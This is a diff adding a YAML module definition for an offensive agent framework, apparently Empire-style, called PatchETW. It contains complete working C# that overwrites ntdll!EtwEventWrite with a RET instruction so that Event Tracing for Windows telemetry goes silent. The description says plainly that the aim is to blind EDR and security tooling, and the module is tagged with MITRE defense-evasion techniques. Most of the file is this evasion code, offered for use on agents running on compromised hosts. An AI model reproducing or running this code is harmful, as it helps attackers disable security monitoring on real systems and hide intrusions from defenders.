@@ -1,0 +1,142 @@
+name: PatchETW
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Patches ntdll!EtwEventWrite in the current process to interfere with Event Tracing for Windows (ETW) telemetry generation.
+  ETW is widely used by EDR and security tooling to collect runtime visibility on process behavior, including script execution and API activity.
+  Using a single-byte RET patch can reduce local ETW signal for this process, while unpatch mode restores the original first byte when available.
+software: ''
+tactics: [TA0005]
+techniques:
+  - T1562.001
+  - T1562.006
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+comments:
+  - https://blog.xpnsec.com/hiding-your-dotnet-etw/
+  - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: Method
+    description: Patch or unpatch ETW.
+    required: true
+    value: patch
+    strict: true
+    suggested_values:
+      - patch
+      - unpatch
+csharp:
+  UnsafeCompile: true
+  CompatibleDotNetVersions:
+    - Net40
+  Code: |
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class Program
+    {
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+        private const byte RET_INSTRUCTION = 0xC3;
+
+        private static byte _originalByte;
+        private static bool _hasOriginalByte;
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        public static void Main(string[] args)
+        {
+            string method = args.Length > 0 ? args[0] : "patch";
+            method = method.ToLowerInvariant();
+
+            IntPtr ntdllBase = GetModuleHandle("ntdll.dll");
+            if (ntdllBase == IntPtr.Zero)
+            {
+                Console.Out.WriteLine("[-] Failed to resolve ntdll.dll module handle.");
+                return;
+            }
+
+            IntPtr etwEventWrite = GetProcAddress(ntdllBase, "EtwEventWrite");
+            if (etwEventWrite == IntPtr.Zero)
+            {
+                Console.Out.WriteLine("[-] Failed to resolve EtwEventWrite address.");
+                return;
+            }
+
+            if (!VirtualProtect(etwEventWrite, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out uint oldProtect))
+            {
+                Console.Out.WriteLine("[-] VirtualProtect failed when changing memory protection.");
+                return;
+            }
+
+            try
+            {
+                unsafe
+                {
+                    byte* functionPointer = (byte*)etwEventWrite.ToPointer();
+
+                    if (method == "patch")
+                    {
+                        if (!_hasOriginalByte)
+                        {
+                            _originalByte = *functionPointer;
+                            _hasOriginalByte = true;
+                        }
+
+                        *functionPointer = RET_INSTRUCTION;
+                        Console.Out.WriteLine("[+] EtwEventWrite patched with RET (0xC3).");
+                    }
+                    else if (method == "unpatch")
+                    {
+                        if (!_hasOriginalByte)
+                        {
+                            Console.Out.WriteLine("[-] Original byte not available in this context; unable to restore.");
+                            return;
+                        }
+
+                        *functionPointer = _originalByte;
+                        Console.Out.WriteLine("[+] EtwEventWrite restored to original first byte (0x{0:X2}).", _originalByte);
+                    }
+                    else
+                    {
+                        Console.Out.WriteLine("[-] Invalid Method value. Use 'patch' or 'unpatch'.");
+                    }
+                }
+            }
+            finally
+            {
+                uint tempOldProtect;
+                if (!VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out tempOldProtect))
+                {
+                    Console.Out.WriteLine("[!] Failed to restore original memory protection.");
+                }
+            }
+        }
+    }
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+  EmbeddedResources: []
